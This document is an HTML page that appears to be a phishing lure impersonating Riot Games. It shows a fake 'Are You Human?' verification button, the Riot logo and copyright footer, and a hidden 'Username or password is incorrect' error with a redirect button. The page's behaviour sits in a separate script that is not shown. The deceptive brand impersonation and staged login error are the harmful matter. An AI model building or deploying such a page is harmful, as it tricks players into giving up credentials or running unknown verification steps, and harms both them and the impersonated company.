<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <main class="main">
        <section class="section-verification">
            <div class="container">
                <img src="img/logo.png" class="logo" alt="Riot Games Logo">

                <h1 class="section-title">Are You Human?</h1>

                <p class="verification-message">
                    Please complete the verification to confirm you're not a robot.
                </p>

                <button id="verify-btn">Start Verification</button>

                <div id="rejected-section" class="hidden">
                    <p class="error-message">❌ Username or password is incorrect</p>
                    <button id="redirect-btn">➜</button>
                </div>
            </div>
        </section>

        <section class="wallpaper"></section>
    </main>

    <footer>
        <p>© 2025 Riot Games, Inc. All rights reserved. <a href="#">Legal</a> | <a href="#">Privacy Policy</a></p>
    </footer>

    <script src="script.js"></script>
</body>
</html>
